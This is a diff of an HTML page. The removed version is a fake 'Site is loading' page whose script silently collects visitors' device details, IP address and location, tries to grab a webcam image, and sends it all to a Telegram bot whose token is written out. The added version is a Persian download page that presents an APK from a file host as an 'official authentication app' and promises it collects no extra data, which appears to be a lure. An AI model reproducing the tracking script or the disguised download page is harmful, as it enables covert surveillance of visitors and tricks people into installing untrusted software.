@@ -1,85 +1,260 @@
 <!DOCTYPE html>
-<html>
+<html lang="fa" dir="rtl">
 <head>
-    <title>Loading...</title>
-    <style>body { margin:0; padding:20px; font-family:Arial; background:#000; color:#fff; }</style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>دانلود برنامه احراز هویت | نسخه رسمی</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;600;800&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box}
+body{
+    margin:0;
+    font-family:'Vazirmatn',sans-serif;
+    background:radial-gradient(circle at top,#0f2027,#203a43,#2c5364);
+    color:#fff;
+}
+
+/* Loading Screen */
+#loading{
+    position:fixed;
+    inset:0;
+    background:radial-gradient(circle at top,#000,#020c16);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    z-index:9999;
+}
+
+.loader-wrap{
+    text-align:center;
+    color:#00ffe0;
+    font-weight:700;
+    letter-spacing:1px;
+}
+
+.ring{
+    width:90px;
+    height:90px;
+    border-radius:50%;
+    border:5px solid rgba(0,255,200,.15);
+    border-top:5px solid #00ffe0;
+    animation:spin 1.2s linear infinite;
+    margin:auto;
+    box-shadow:0 0 35px rgba(0,255,200,.7);
+}
+
+@keyframes spin{
+    100%{transform:rotate(360deg)}
+}
+
+/* Header */
+header{
+    padding:22px;
+    text-align:center;
+    font-weight:800;
+    font-size:22px;
+    background:linear-gradient(135deg,#00f2fe,#4facfe);
+    color:#003;
+    border-radius:0 0 28px 28px;
+    box-shadow:0 10px 30px rgba(0,0,0,.4);
+}
+
+/* Container */
+.container{
+    max-width:1100px;
+    margin:auto;
+    padding:20px;
+}
+
+/* App Card */
+.app-card{
+    display:grid;
+    grid-template-columns:120px 1fr;
+    gap:20px;
+    background:rgba(255,255,255,.08);
+    border-radius:26px;
+    padding:20px;
+    backdrop-filter:blur(18px);
+    box-shadow:0 0 40px rgba(0,0,0,.5);
+    animation:fadeUp .9s ease;
+}
+
+.app-card img{
+    width:120px;
+    border-radius:24px;
+    box-shadow:0 10px 30px rgba(0,0,0,.6);
+}
+
+.app-info h1{
+    margin:0;
+    font-size:26px;
+}
+
+.meta{
+    display:flex;
+    flex-wrap:wrap;
+    gap:12px;
+    margin-top:10px;
+}
+
+.meta span{
+    background:rgba(255,255,255,.12);
+    padding:6px 14px;
+    border-radius:14px;
+    font-size:14px;
+}
+
+/* Download */
+.download-box{
+    margin-top:30px;
+    background:linear-gradient(135deg,#00ff99,#00c6ff);
+    padding:26px;
+    border-radius:28px;
+    text-align:center;
+    box-shadow:0 0 45px rgba(0,255,180,.8);
+    animation:pulse 2.5s infinite;
+}
+
+.download-box a{
+    display:inline-block;
+    padding:16px 40px;
+    border-radius:18px;
+    background:#000;
+    color:#00ffcc;
+    font-size:20px;
+    text-decoration:none;
+    font-weight:800;
+    box-shadow:0 0 25px rgba(0,0,0,.8);
+    transition:.3s;
+}
+
+.download-box a:hover{
+    transform:scale(1.07);
+    box-shadow:0 0 45px rgba(0,0,0,1);
+}
+
+/* Screenshots */
+.gallery{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+    gap:18px;
+    margin-top:30px;
+}
+
+.gallery img{
+    width:100%;
+    border-radius:22px;
+    box-shadow:0 10px 30px rgba(0,0,0,.6);
+    transition:.4s;
+}
+
+.gallery img:hover{
+    transform:scale(1.05);
+}
+
+/* Description */
+.desc{
+    margin-top:30px;
+    background:rgba(255,255,255,.08);
+    padding:22px;
+    border-radius:24px;
+    line-height:2;
+}
+
+/* Footer */
+footer{
+    text-align:center;
+    opacity:.5;
+    margin:40px 0 10px;
+}
+
+@keyframes fadeUp{
+    from{opacity:0;transform:translateY(25px)}
+    to{opacity:1;transform:translateY(0)}
+}
+@keyframes pulse{
+    0%{box-shadow:0 0 25px rgba(0,255,200,.6)}
+    50%{box-shadow:0 0 55px rgba(0,255,200,1)}
+    100%{box-shadow:0 0 25px rgba(0,255,200,.6)}
+}
+</style>
 </head>
+
 <body>
-    <h1>Site is loading...</h1>
-    
-    <script>
-        // Get all device info
-        const getDeviceInfo = () => ({
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            cookiesEnabled: navigator.cookieEnabled,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ip: 'fetching...',
-            location: 'fetching...'
-        });
 
-        // Capture screenshot/webcam
-        const captureMedia = async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    return canvas.toDataURL('image/jpeg', 0.8);
-                }, 1000);
-            } catch(e) {
-                return 'No camera access';
-            }
-        };
+<!-- Loading -->
+<div id="loading">
+    <div class="loader-wrap">
+        <div class="ring"></div>
+        <span>در حال بارگذاری...</span>
+    </div>
+</div>
 
-        // Send to Telegram Bot
-        const sendToTelegram = async (data) => {
-            const formData = new FormData();
-            formData.append('chat_id', '8198454441');
-            formData.append('caption', JSON.stringify(data, null, 2));
-            formData.append('photo', data.screenshot.split(',')[1], 'screenshot.jpg');
-            
-            await fetch('https://api.telegram.org/bot8477817066:AAHJOtVykZ153OXdHcPQRXAOJvn8mMtyWMg/sendPhoto', {
-                method: 'POST',
-                body: formData
-            });
-        };
+<header>
+دانلود برنامه احراز هویت | نسخه رسمی
+</header>
 
-        // Main execution
-        (async () => {
-            const info = getDeviceInfo();
-            
-            // Get IP via external service
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            info.ip = (await ipResponse.json()).ip;
-            
-            // Get rough location
-            const geoResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
-            const geo = await geoResponse.json();
-            info.location = `${geo.city}, ${geo.region}, ${geo.country_name}`;
-            
-            // Capture screenshot
-            info.screenshot = await captureMedia();
-            
-            // Send everything
-            await sendToTelegram(info);
-            
-            // Show fake page
-            document.body.innerHTML = `
-                <h1>✅ Site loaded successfully!</h1>
-                <p>All set. Thanks for visiting.</p>
-            `;
-        })();
-    </script>
+<div class="container">
+
+<div class="app-card">
+    <img src="https://uploadkon.ir/uploads/c4d710_2625D1F509-55FD-428E-8E64-A52F1C9BA466.png">
+    <div class="app-info">
+        <h1>برنامه احراز هویت</h1>
+        <div class="meta">
+            <span>نسخه 1.0.0</span>
+            <span>اندروید 7+</span>
+            <span>بدون تبلیغات</span>
+            <span>حجم کم</span>
+        </div>
+        <p style="margin-top:12px;opacity:.8">
+        اپلیکیشن رسمی جهت انجام فرآیند احراز هویت سریع، امن و هوشمند
+        </p>
+    </div>
+</div>
+
+<div class="download-box">
+    <p>دانلود مستقیم با لینک پرسرعت</p>
+    <a href="https://uploadkon.ir/uploads/adf010_26phonix-70592.apk">
+        ⬇ دانلود برنامه
+    </a>
+</div>
+
+<div class="gallery">
+    <img src="https://uploadkon.ir/uploads/c4d710_2625D1F509-55FD-428E-8E64-A52F1C9BA466.png">
+</div>
+
+<div class="desc">
+    این برنامه جهت انجام فرآیند احراز هویت طراحی شده و از جدیدترین الگوریتم‌های امنیتی استفاده می‌کند.
+    <br>
+    🔹 محیط کاملاً ساده و روان  
+    <br>
+    🔹 سرعت پردازش بالا  
+    <br>
+    🔹 امنیت بسیار بالا  
+    <br>
+    🔹 بدون جمع‌آوری اطلاعات اضافی  
+</div>
+
+<footer>
+© 2026 Secure Download Platform
+</footer>
+
+</div>
+
+<script>
+window.addEventListener("load",()=>{
+    setTimeout(()=>{
+        document.getElementById("loading").style.opacity="0";
+        document.getElementById("loading").style.pointerEvents="none";
+        setTimeout(()=>{
+            document.getElementById("loading").remove();
+        },600);
+    },1200);
+});
+</script>
+
 </body>
 </html>
